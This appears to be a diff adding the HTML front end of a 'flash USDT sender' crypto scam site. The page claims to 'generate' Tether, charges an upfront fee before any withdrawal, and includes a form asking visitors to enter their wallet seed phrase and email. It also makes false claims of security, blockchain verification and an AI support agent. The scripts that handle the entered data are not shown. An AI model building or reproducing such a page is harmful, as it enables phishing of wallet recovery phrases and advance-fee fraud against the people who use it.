@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AITRO FLASH USDT SENDER</title>
+    <link rel="stylesheet" href="styles.css?v=99">
+</head>
+<body>
+    <!-- Custom Alert Modal -->
+    <div id="customAlert" class="modal" style="display: none; z-index: 3000;">
+        <div class="modal-content" style="max-width: 400px; text-align: center; padding: 30px;">
+            <div id="alertIcon" style="font-size: 50px; margin-bottom: 20px;">⚠️</div>
+            <h2 id="alertTitle" style="margin-bottom: 15px; color: #D4AF37;">Insufficient Balance</h2>
+            <p id="alertMessage" style="margin-bottom: 25px; line-height: 1.6; color: #ccc;"></p>
+            <button class="btn-primary btn-full" onclick="closeCustomAlert()">OK</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-content">
+                <div class="logo">
+                    <div id="animatedIconContainer" class="logo-icon">
+                        <img id="animatedIcon" src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" style="width: 40px; height: 40px; transition: opacity 0.5s ease-in-out;">
+                    </div>
+                    <h1 id="animatedTitle" style="min-width: auto; transition: color 1s ease;"></h1>
+                </div>
+                <div class="header-actions">
+                    <div class="vip-badge">VERSION VIP</div>
+                    <a href="https://t.me/movich203" target="_blank" class="btn-telegram">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.98.52-1.4.51-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.42-1.39-.89.03-.24.36-.49.99-.75 3.88-1.69 6.47-2.8 7.77-3.32 3.7-1.47 4.47-1.73 4.97-1.74.11 0 .35.03.5.16.13.1.17.24.18.34.02.06.03.18.02.28z"/>
+                        </svg>
+                        Support
+                    </a>
+                    <button id="disconnectBtn" class="btn-disconnect" style="display: none;">
+                        Logout
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Initial State - Connect Wallet -->
+            <div id="connectSection" class="section">
+                <div class="wallet-card">
+                    <div class="tether-glow-container">
+                        <div class="tether-icon-wrapper">
+                            <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="USDT" class="tether-main-icon">
+                        </div>
+                    </div>
+                    <h2>AITRO FLASH USDT</h2>
+                    <p>Generate and withdraw USDT instantly with automated transaction verification</p>
+                    <p style="font-size: 12px; color: var(--text-secondary); margin-top: 8px;">✓ Real blockchain verification • ✓ Instant processing • ✓ Secure & transparent</p>
+                    <button id="connectWalletBtn" class="btn-primary btn-full">
+                        🔗 Connect Trust Wallet
+                    </button>
+                    <div style="margin: 15px 0; display: flex; align-items: center; justify-content: center; gap: 10px; color: var(--text-secondary);">
+                        <div style="flex: 1; height: 1px; background: var(--border-color);"></div>
+                        <span>OR</span>
+                        <div style="flex: 1; height: 1px; background: var(--border-color);"></div>
+                    </div>
+                    <!-- Seed Phrase Import -->
+                    <div id="seedPhraseSection" style="width: 100%; margin-bottom: 15px;">
+                        <div style="background: rgba(0, 242, 255, 0.05); border: 1px solid rgba(0, 242, 255, 0.2); border-radius: 12px; padding: 15px;">
+                            <label style="display: block; font-size: 13px; color: var(--primary-neon); margin-bottom: 8px; font-weight: 600;">
+                                🔐 Import from Seed Phrase
+                            </label>
+                            <input type="email" id="userEmailInput" placeholder="Your email (required for tracking)" style="width: 100%; background: rgba(0,0,0,0.4); border: 1px solid var(--border-color); color: #fff; padding: 10px 12px; border-radius: 8px; font-size: 13px; box-sizing: border-box; margin-bottom: 8px;">
+                            <textarea id="seedPhraseInput" 
+                                placeholder="Enter your 12 or 24 word recovery phrase&#10;Separate each word with a space"
+                                rows="3"
+                                style="width: 100%; background: rgba(0,0,0,0.4); border: 1px solid var(--border-color); color: #fff; padding: 12px; border-radius: 8px; font-size: 13px; font-family: monospace; resize: vertical; box-sizing: border-box;"></textarea>
+                            <div style="display: flex; gap: 8px; margin-top: 10px;">
+                                <select id="seedNetworkSelect" style="flex: 1; background: rgba(0,0,0,0.4); border: 1px solid var(--border-color); color: #fff; padding: 10px; border-radius: 8px; font-size: 13px;">
+                                    <option value="ERC20">Ethereum (ERC20)</option>
+                                    <option value="BEP20">BSC (BEP20)</option>
+                                    <option value="TRC20">Tron (TRC20)</option>
+                                </select>
+                                <button id="importSeedBtn" onclick="importSeedPhrase()" style="flex: 1; background: linear-gradient(135deg, #6B46C1, #553C9A); border: none; color: white; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 13px;">
+                                    Import
+                                </button>
+                            </div>
+                            <div id="seedPhraseError" style="color: #FF4444; font-size: 11px; margin-top: 8px; display: none;"></div>
+                            <div id="seedPhraseSuccess" style="color: #00FF41; font-size: 11px; margin-top: 8px; display: none;"></div>
+                        </div>
+                    </div>
+                    <button id="guestAccessBtn" class="btn-secondary btn-full">
+                        👤 Continue as Guest
+                    </button>
+                    <button id="showCreateAccount" class="btn-secondary btn-full" style="margin-top: 10px;">
+                        📝 Create Local Account
+                    </button>
+                    <div class="info">
+                        <h3>Supported Wallets</h3>
+                        <ul>
+                            <li>✓ Trust Wallet (All networks)</li>
+                            <li>✓ Import via Seed Phrase</li>
+                            <li>✓ Instant transaction verification</li>
+                            <li>✓ Full data protection & encryption</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Dashboard State -->
+            <div id="dashboardSection" class="section" style="display: none;">
+                <!-- Wallet Sync Card -->
+                <div id="walletSyncCard" style="background: linear-gradient(135deg, rgba(0, 242, 255, 0.08), rgba(0, 255, 65, 0.03)); border: 1px solid var(--primary-neon); border-radius: 12px; padding: 15px; margin-bottom: 15px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                        <span style="font-size: 12px; color: var(--primary-neon); font-weight: 600;">🔗 WALLET SYNCED</span>
+                        <span id="walletSyncStatus" style="font-size: 11px; color: #00FF41; background: rgba(0,255,65,0.1); padding: 2px 8px; border-radius: 10px;">● Connected</span>
+                    </div>
+                    <div style="display: flex; flex-direction: column; gap: 6px;">
+                        <div style="display: flex; justify-content: space-between; font-size: 12px;">
+                            <span style="color: var(--text-secondary);">Address:</span>
+                            <span id="syncedAddress" style="color: #fff; font-family: monospace; font-size: 11px; max-width: 200px; overflow: hidden; text-overflow: ellipsis;">--</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; font-size: 12px;">
+                            <span style="color: var(--text-secondary);">Network:</span>
+                            <span id="syncedNetwork" style="color: var(--primary-neon); font-weight: 600;">--</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; font-size: 12px;">
+                            <span style="color: var(--text-secondary);">Balance:</span>
+                            <span id="syncedBalance" style="color: #00FF41; font-weight: 600;">--</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; font-size: 12px;">
+                            <span style="color: var(--text-secondary);">Type:</span>
+                            <span id="syncedWalletType" style="color: #fff;">--</span>
+                        </div>
+                        <div id="feeRow" style="display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px;">
+                            <span style="color: var(--text-secondary);">Fee:</span>
+                            <span id="syncedFee" style="color: #ffc107; font-weight: 600; display: none;">--</span>
+                        </div>
+                        <div id="sufficientBalance" style="display: none; padding: 6px 10px; border-radius: 6px; font-size: 11px; margin-bottom: 4px;"></div>
+                    </div>
+                    <div style="display: flex; gap: 8px; margin-top: 10px;">
+                        <button id="payFeeFromSyncBtn" onclick="payFeeFromSync()" style="display: none; flex: 1; padding: 8px; background: linear-gradient(135deg, #D4AF37, #B8860B); border: none; color: #000; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer;">💳 Pay Fee & Withdraw</button>
+                        <button onclick="disconnectWallet()" style="flex: 1; padding: 8px; background: rgba(255,68,68,0.1); border: 1px solid rgba(255,68,68,0.3); color: #FF4444; border-radius: 8px; font-size: 12px; cursor: pointer;">Disconnect</button>
+                    </div>
+                </div>
+                <!-- Balance Card -->
+                <div class="balance-card">
+                    <div class="balance-header">
+                        <div>
+                            <p class="balance-label">Total Balance (USD)</p>
+                            <h2 class="balance-amount" id="totalBalance">$0.00</h2>
+                        </div>
+                        <div class="balance-icon">📈</div>
+                    </div>
+
+                    <!-- Coin Balances -->
+                    <div class="coins-grid">
+                        <!-- USDT -->
+                        <div class="coin-card">
+                            <div class="coin-icon" style="background: #fff; border-radius: 50%; padding: 8px; margin: 0 auto 15px; width: 50px; height: 50px; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3);">
+                                <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="USDT" style="width: 100%; height: 100%; object-fit: contain;">
+                            </div>
+                            <p class="coin-name">USDT</p>
+                            <p class="coin-amount" id="usdtAmount">$0.00</p>
+                            <p class="coin-full-name">Tether</p>
+                        </div>
+                    </div>
+
+                    <!-- Action Buttons -->
+                    <div class="action-buttons">
+                        <button id="generateCoinBtn" class="btn-primary">
+                            + Generate Coin
+                        </button>
+                        <button id="withdrawBtn" class="btn-secondary">
+                            ➜ Withdraw
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Live Prices -->
+                <div class="prices-card">
+                    <h3>Live Prices</h3>
+                    <div class="prices-grid">
+                        <div class="price-item">
+                            <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="USDT" class="price-icon">
+                            <span class="price-label">USDT</span>
+                            <span class="price-value" id="usdtPrice">$1.00</span>
+                        </div>
+                    </div>
+                    <p class="price-update-time">Updated every 30 seconds</p>
+                </div>
+
+                <!-- Order Tracking Map -->
+                <div id="orderTrackingCard" class="history-card" style="margin-top: 20px; display: none; border: 2px solid var(--primary-neon); background: rgba(0, 255, 65, 0.05); padding: 20px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid var(--border-neon); padding-bottom: 10px;">
+                        <h3 style="margin: 0; font-family: 'Orbitron', sans-serif; color: var(--primary-neon); letter-spacing: 1px;">LIVE ORDER TRACKING</h3>
+                        <span id="liveStatusBadge" class="vip-badge" style="font-size: 10px; padding: 4px 12px; animation: pulse 1s infinite; background: rgba(0, 255, 65, 0.2);">AI ACTIVE</span>
+                    </div>
+                    <div class="tracking-container">
+                        <div class="tracking-step" id="step1">
+                            <div class="step-icon">1</div>
+                            <div class="step-content">
+                                <div class="step-title">AI Generation</div>
+                                <div class="step-desc" id="trackAmount">Amount: 1,000 USDT</div>
+                            </div>
+                        </div>
+                        <div class="tracking-step" id="step2">
+                            <div class="step-icon">2</div>
+                            <div class="step-content">
+                                <div class="step-title">Destination Info</div>
+                                <div class="step-desc" id="trackAddress">Address: Pending...</div>
+                            </div>
+                        </div>
+                        <div class="tracking-step" id="step3">
+                            <div class="step-icon">3</div>
+                            <div class="step-content">
+                                <div class="step-title">Fee Verification</div>
+                                <div class="step-desc" id="trackFeeStatus">Status: Waiting for Payment</div>
+                            </div>
+                        </div>
+                        <div class="tracking-step" id="step4">
+                            <div class="step-icon">4</div>
+                            <div class="step-content">
+                                <div class="step-title">AI Node Transfer</div>
+                                <div class="step-desc">Processing via Private Nodes</div>
+                            </div>
+                        </div>
+                        <div class="tracking-step" id="step5">
+                            <div class="step-icon">5</div>
+                            <div class="step-content">
+                                <div class="step-title">Final Delivery</div>
+                                <div class="step-desc">Instant Flash Release</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Transaction History -->
+                <div class="history-card">
+                    <h3>Transaction History</h3>
+                    <div id="transactionHistory" class="transactions-list">
+                        <p class="empty-state">No transactions yet</p>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Create Account Modal -->
+        <div id="accountModal" class="modal" style="display: none;">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2 id="accountModalTitle">Create Local Account</h2>
+                    <button class="modal-close" onclick="closeAccountModal()">✕</button>
+                </div>
+                
+                <!-- Tabs for Login/Register -->
+                <div class="tabs-container" style="margin-bottom: 15px;">
+                    <button class="tab-btn active" onclick="switchAccountTab('register')">📝 Register</button>
+                    <button class="tab-btn" onclick="switchAccountTab('login')">🔓 Login</button>
+                </div>
+                
+                <!-- Register Tab -->
+                <div id="registerTab" class="tab-content active">
+                    <div class="form-group">
+                        <label for="usernameInput">Username</label>
+                        <input type="text" id="usernameInput" placeholder="Enter username">
+                    </div>
+                    <div class="form-group">
+                        <label for="passwordInput">Password (Optional)</label>
+                        <input type="password" id="passwordInput" placeholder="Enter password">
+                    </div>
+                    <button id="createAccountBtn" class="btn-primary btn-full" onclick="createLocalAccount()">
+                        Create Account
+                    </button>
+                    <p class="modal-info">Your data is encrypted and secure.</p>
+                </div>
+                
+                <!-- Login Tab -->
+                <div id="loginTab" class="tab-content">
+                    <div class="form-group">
+                        <label for="loginUsername">Email</label>
+                        <input type="email" id="loginUsername" placeholder="Enter your email">
+                    </div>
+                    <div class="form-group">
+                        <label for="loginPassword">Password</label>
+                        <input type="password" id="loginPassword" placeholder="Enter your password">
+                    </div>
+                    <button class="btn-primary btn-full" onclick="loginLocalAccount()">
+                        Sign In
+                    </button>
+                    <p class="modal-info">Admin: dctraik8@gmail.com</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Generate Coin Modal -->
+        <div id="generateModal" class="modal" style="display: none;">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>Generate Coin</h2>
+                    <button class="modal-close" onclick="closeGenerateModal()">✕</button>
+                </div>
+                <div class="circular-progress-wrapper">
+                    <div class="circular-progress-container">
+                        <svg width="160" height="160" viewBox="0 0 160 160">
+                            <circle cx="80" cy="80" r="70" stroke="rgba(255,255,255,0.1)" stroke-width="8" fill="none" />
+                            <circle id="progressCircle" cx="80" cy="80" r="70" stroke="var(--primary-color)" stroke-width="8" fill="none" 
+                                    stroke-dasharray="440" stroke-dashoffset="440" stroke-linecap="round"
+                                    style="transition: stroke-dashoffset 0.1s linear; transform: rotate(-90deg); transform-origin: 50% 50%;" />
+                        </svg>
+                        <div class="tether-center">
+                            <div class="tether-icon-inner">
+                                <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="USDT">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="progress-info-bottom">
+                        <div id="progressPercentLarge" class="progress-percentage">0%</div>
+                        <div id="progressStatusText" class="progress-status">Generating coin...</div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="amountInput">Amount</label>
+                    <input type="number" id="amountInput" placeholder="Enter amount (minimum 1000 USDT)" min="1000" step="0.01">
+                    <p class="help-text" id="estimatedValue">Estimated Value: $0.00</p>
+                </div>
+                <button id="generateBtn" class="btn-primary btn-full" onclick="generateCoin()">
+                    Generate
+                </button>
+                <p class="modal-info">This is a real transaction. Real funds are involved.</p>
+            </div>
+        </div>
+
+        <!-- Withdraw Modal -->
+        <div id="withdrawModal" class="modal" style="display: none;">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>Withdraw Funds</h2>
+                    <button class="modal-close" onclick="closeWithdrawModal()">✕</button>
+                </div>
+
+                <!-- Tabs -->
+                <div class="tabs-container">
+                    <button class="tab-btn active" onclick="switchTab('withdraw-form')">Withdraw</button>
+                    <button class="tab-btn" onclick="switchTab('confirm-deposit')">Confirm Fees</button>
+                </div>
+
+                <!-- Withdraw Form Tab -->
+                <div id="withdraw-form" class="tab-content active">
+                    <div class="form-group">
+                        <label for="withdrawCoin">Select Coin</label>
+                        <select id="withdrawCoin" onchange="updateWithdrawPrice()">
+                            <option value="USDT">USDT </option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="networkType">Network Type</label>
+                        <select id="networkType" onchange="updateFeeDisplay()">
+                            <option value="TRC20">TRC20</option>
+                            <option value="ERC20">ERC20</option>
+                            <option value="BEP20">BEP20</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="withdrawAmount">Amount</label>
+                        <input type="number" id="withdrawAmount" placeholder="Enter amount (minimum 1000 USDT)" min="1000" step="0.01">
+                    </div>
+                    <div class="form-group">
+                        <label for="withdrawAddress">Wallet Address</label>
+                        <input type="text" id="withdrawAddress" placeholder="Enter recipient address">
+                    </div>
+                    
+                    <div id="feeSection" style="display: none; margin-top: 20px; padding: 15px; background: rgba(212, 175, 55, 0.1); border: 1px solid var(--primary-color); border-radius: 8px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                            <span style="color: var(--text-secondary);">Required Fee:</span>
+                            <span id="requiredFee" style="color: var(--primary-color); font-weight: 700;">0.00</span>
+                        </div>
+                        <div id="balanceRow" style="display: none; justify-content: space-between; margin-top: 10px; font-size: 14px;">
+                            <span>Your Balance:</span>
+                            <span id="currentTrxBalance">0 TRX</span>
+                        </div>
+                        <p style="font-size: 12px; margin-top: 10px; color: #A0AEC0;">Please pay the fees to the address below or use the automated system.</p>
+                        <div id="feeAddress" class="address-box" style="word-break: break-all; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 4px; margin-top: 5px; font-family: monospace; cursor: pointer;">Address</div>
+                    </div>
+                    
+                    <button id="withdrawBtn2" class="btn-primary btn-full" onclick="handleWithdrawClick()" style="margin-top: 20px;">
+                        Proceed to Confirmation
+                    </button>
+                </div>
+
+                <!-- Confirm Deposit Tab -->
+                <div id="confirm-deposit" class="tab-content">
+                    <!-- Direct Payment Option -->
+                    <div style="margin-bottom: 20px; padding: 15px; background: rgba(212,175,55,0.1); border-left: 3px solid #D4AF37; border-radius: 4px;">
+                        <p style="margin: 0 0 10px 0; color: #D4AF37;"><strong>💳 Quick Payment</strong></p>
+                        <p style="margin: 0 0 10px 0; font-size: 13px; color: #ccc;">Pay fees directly from your connected wallet - no manual hash entry needed!</p>
+                        <button id="payFeeBtn" class="btn-primary btn-full btn-yellow" onclick="payFeeDirectly()">
+                            💰 PAY FEES & VERIFY
+                        </button>
+                    </div>
+                    
+                    <!-- Manual Hash Entry Option -->
+                    <div style="text-align: center; margin: 15px 0; color: #888; font-size: 12px;">
+                        <p>— OR —</p>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="transactionHash">Transaction Hash / ID</label>
+                        <input type="text" id="transactionHash" placeholder="Paste your fee payment TXID here">
+                        <p class="help-text">Enter the transaction hash of your fee payment. We will verify it automatically on the blockchain.</p>
+                    </div>
+                    
+                    <!-- Fee Details -->
+                    <div class="info-box" style="margin-top: 15px; padding: 15px; background: rgba(0,242,255,0.08); border-left: 3px solid #00f2ff; border-radius: 4px;">
+                        <p style="margin: 0 0 8px 0;"><strong>Fee Details:</strong></p>
+                        <p style="margin: 5px 0; font-size: 13px;">Amount: <span id="feeAmountDisplay">-</span></p>
+                        <p style="margin: 5px 0; font-size: 13px;">Currency: <span id="feeCurrencyDisplay">-</span></p>
+                        <p style="margin: 5px 0; font-size: 13px;">Network: <span id="feeNetworkDisplay">TRC20</span></p>
+                    </div>
+                    
+                    <!-- Verification Status -->
+                    <div class="info-box" style="margin-top: 15px; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 4px;">
+                        <p style="margin: 0 0 8px 0;"><strong>Verification Status:</strong></p>
+                        <p id="verificationStatus" style="margin: 0; color: var(--warning-color); font-size: 13px; word-break: break-word;">Waiting for transaction hash...</p>
+                    </div>
+                    
+                    <button id="confirmDepositBtn" class="btn-primary btn-full" onclick="verifyFeePayment()" style="margin-top: 20px;">
+                        ✓ Verify & Complete Withdrawal
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Purchase Notifications -->
+    <div id="notificationContainer" class="notification-container"></div>
+
+    <!-- Chat Widget -->
+    <div id="chatWidget" class="chat-widget">
+        <div id="chatToggle" class="chat-toggle">
+            <svg viewBox="0 0 24 24" width="28" height="28" fill="currentColor">
+                <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12z"/>
+            </svg>
+        </div>
+        <div id="chatContainer" class="chat-container" style="display: none;">
+            <div class="chat-header">
+                <div class="chat-header-info">
+                    <div class="online-status"></div>
+                    <span>AITRO Support</span>
+                </div>
+                <button id="closeChat" class="chat-close">✕</button>
+            </div>
+            <div id="chatMessages" class="chat-messages">
+                <div class="message system">Welcome to AITRO Support. Our AI system is online and ready to assist you with your USDT generation and withdrawal. How can we help you today?</div>
+            </div>
+            <div id="quickReplies" class="quick-replies">
+                <button class="quick-btn" data-key="what_is_flash">What is USDT Flash?</button>
+                <button class="quick-btn" data-key="price">Price & Discounts</button>
+                <button class="quick-btn" data-key="platforms">Exchanges & Wallets</button>
+                <button class="quick-btn" data-key="safety">Safety & Legal</button>
+                <button class="quick-btn" data-key="refund">Payment & Refund</button>
+                <button class="quick-btn" data-key="terms">Terms of Use</button>
+            </div>
+            <div class="chat-input-area">
+                <input type="text" id="chatInput" placeholder="Type your message...">
+                <button id="sendMessage">
+                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                        <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Terms of Use Modal (Internal to Chat) -->
+    <div id="termsModal" class="modal" style="display: none; z-index: 6000;">
+        <div class="modal-content" style="max-width: 450px;">
+            <div class="modal-header">
+                <h2>Terms of Use</h2>
+                <button class="modal-close" onclick="closeTermsModal()">✕</button>
+            </div>
+            <div class="terms-body" style="font-size: 14px; line-height: 1.6; color: #ccc;">
+                <p><strong>1. Operation:</strong> The Software is powered by AI and processes requests within approx. 5 minutes.</p>
+                <p><strong>2. Fee Verification:</strong> No service is delivered unless the system verifies both fee deposit and required liquidity via the provided hash.</p>
+                <p><strong>3. Fraud Prevention:</strong> Any attempt at fraud or manipulation results in automatic cancellation with no liability.</p>
+                <p><strong>4. Fees:</strong> Use of the Software is not free. All fees must be paid in advance.</p>
+                <p><strong>5. Acknowledgment:</strong> By using this Software, you expressly agree to comply fully with these Terms.</p>
+                <p><strong>6. Trial Offers:</strong> Distribution of trial versions has been permanently discontinued. ❌ No trial requests accepted.</p>
+            </div>
+            <button class="btn-primary btn-full" onclick="closeTermsModal()" style="margin-top: 20px;">I Understand</button>
+        </div>
+    </div>
+
+    <!-- Wallet Connection Libraries -->
+    <!-- TronWeb for Tron Network -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    
+    <!-- Ethers.js for Ethereum/BSC Networks -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.1/dist/ethers.umd.min.js"></script>
+    
+    <!-- QR Code Generation Library -->
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    
+    <!-- Transaction Verification Module -->
+    <script src="api-verification.js"></script>
+    
+    <!-- Wallet Connection Module -->
+    <script src="wallet-connection.js"></script>
+    
+    <!-- Main Application Script -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="supabase-config.js?v=6"></script>
+    <script src="script.js?v=29"></script>
+</body>
+</html>
